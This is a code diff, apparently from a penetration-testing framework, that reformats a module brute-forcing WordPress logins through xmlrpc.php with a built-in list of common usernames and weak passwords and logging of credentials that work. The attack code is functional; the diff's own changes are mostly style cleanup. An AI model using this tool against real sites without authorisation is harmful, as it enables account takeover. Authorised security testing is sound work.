@@ -19,25 +19,22 @@ from core.load_modules import load_file_path
 from lib.socks_resolver.engine import getaddrinfo
 from core._time import now
 from core.log import __log_into_file
-from core._die import __die_failure
-from lib.scan.wp_theme import themes
-from lib.scan.wp_theme import small_themes
 
 
 def extra_requirements_dict():
     return {
         "wp_users": ["admin", "root", "test", "anonymous", "user", "support"],
         "wp_passwds": ["admin", "root", "test", "anonymous", "user", "1", "12345",
-                                    "123456", "124567", "12345678", "123456789", "1234567890", "admin1",
-                                    "password!@#", "support", "1qaz2wsx", "qweasd", "qwerty", "!QAZ2wsx",
-                                    "password1", "1qazxcvbnm", "zxcvbnm", "iloveyou", "password", "p@ssw0rd",
-                                    "admin123", ""],
+                       "123456", "124567", "12345678", "123456789", "1234567890", "admin1",
+                       "password!@#", "support", "1qaz2wsx", "qweasd", "qwerty", "!QAZ2wsx",
+                       "password1", "1qazxcvbnm", "zxcvbnm", "iloveyou", "password", "p@ssw0rd",
+                       "admin123", ""],
         "wp_xmlrpc_brute_ports": [80, 443]
     }
 
 
 def check(user, passwd, target, port, headers, timeout_sec, log_in_file, language,
-            retries, time_sleep, thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
+          retries, time_sleep, thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
     time.sleep(time_sleep)
     try:
         if socks_proxy is not None:
@@ -65,14 +62,17 @@ def check(user, passwd, target, port, headers, timeout_sec, log_in_file, languag
                 if target_type(target) != "HTTP" and port == 80:
                     target = 'http://' + target
                 target = target + '/xmlrpc.php'
-                postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>'''+ user +'''</string></value></param><param><value><string>'''+ passwd + '''</string></value></param></params></methodCall>'''
+                postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>''' +\
+                    user + '''</string></value></param><param><value><string>''' + passwd + \
+                    '''</string></value></param></params></methodCall>'''
                 r = requests.post(
-                        target, timeout = timeout_sec, headers = headers, data = postdata)
+                    target, timeout=timeout_sec, headers=headers, data=postdata)
                 if "incorrect" not in r.text.lower() and user in r.text.lower():
                     info(messages(language, "user_pass_found").format(
-                                    user, passwd, target, port))
-                    data = json.dumps({'HOST': target, 'USERNAME': user, 'PASSWORD': passwd, 'PORT': port, 'TYPE': 'wp_xmlrpc_brute',
-                               'DESCRIPTION': messages(language, "login_successful"), 'TIME': now(), 'CATEGORY': "brute"}) + "\n"
+                        user, passwd, target, port))
+                    data = json.dumps({'HOST': target, 'USERNAME': user, 'PASSWORD': passwd, 'PORT': port,
+                                       'TYPE': 'wp_xmlrpc_brute', 'DESCRIPTION': messages(language, "login_successful"),
+                                       'TIME': now(), 'CATEGORY': "brute"}) + "\n"
                     __log_into_file(log_in_file, 'a', data, language)
                 break
             except:
@@ -85,7 +85,8 @@ def check(user, passwd, target, port, headers, timeout_sec, log_in_file, languag
         return False
 
 
-def test(target, port, retries, timeout_sec, headers, socks_proxy, verbose_level, trying, total_req, total, num, language):
+def test(target, port, retries, timeout_sec, headers, socks_proxy,
+         verbose_level, trying, total_req, total, num, language):
     if socks_proxy is not None:
         socks_version = socks.SOCKS5 if socks_proxy.startswith(
             'socks5://') else socks.SOCKS4
@@ -111,19 +112,15 @@ def test(target, port, retries, timeout_sec, headers, socks_proxy, verbose_level
                 target = 'https://' + target
             if target_type(target) != "HTTP" and port == 80:
                 target = 'http://' + target
-            postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string></string></value></param></params></methodCall>'''
+            postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>
+            <string>admin</string></value></param><param><value><string></string></value></param></params></methodCall>'''
             try:
-                req = requests.post(target+'/xmlrpc.php', data = postdata, headers = headers)
-                #print (target)
-                if re.search('<int>403</int>',req.text):
-                    return True
-                else:
-                    return False
+                req = requests.post(target+'/xmlrpc.php', data=postdata, headers=headers)
+                return bool(re.search('<int>403</int>', req.text))
             except:
                 return False
         except Exception as err:
             return False
-            
 
 
 def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
@@ -167,7 +164,7 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
         if ports is None:
             ports = extra_requirements["wp_xmlrpc_brute_ports"]
         if verbose_level > 3:
-            total_req = len(users) * len(passwds) * len (ports)
+            total_req = len(users) * len(passwds) * len(ports)
         else:
             total_req = len(users) * len(passwds) * len(ports)
         thread_tmp_filename = '{}/tmp/thread_tmp_'.format(load_file_path()) + ''.join(
@@ -185,14 +182,15 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                         #print(user + " " + passwd)
                         t = threading.Thread(target=check,
                                              args=(
-                                                 user, passwd, target, port, headers, timeout_sec, log_in_file, language,
-                                                 retries, time_sleep, thread_tmp_filename, socks_proxy,
+                                                 user, passwd, target, port, headers, timeout_sec, log_in_file,
+                                                 language, retries, time_sleep, thread_tmp_filename, socks_proxy,
                                                  scan_id, scan_cmd))
                         threads.append(t)
                         t.start()
                         trying += 1
                         if verbose_level > 3:
-                            info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target),
+                            info(messages(language, "trying_message").format(trying, total_req, num, total,
+                                                                             target_to_host(target),
                                                                              port, 'wp_xmlrpc_brute'))
                         while 1:
                             try:
@@ -221,7 +219,6 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                     break
             except KeyboardInterrupt:
                 break
-        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
         os.remove(thread_tmp_filename)
     else:
         warn(messages(language, "input_target_error").format(
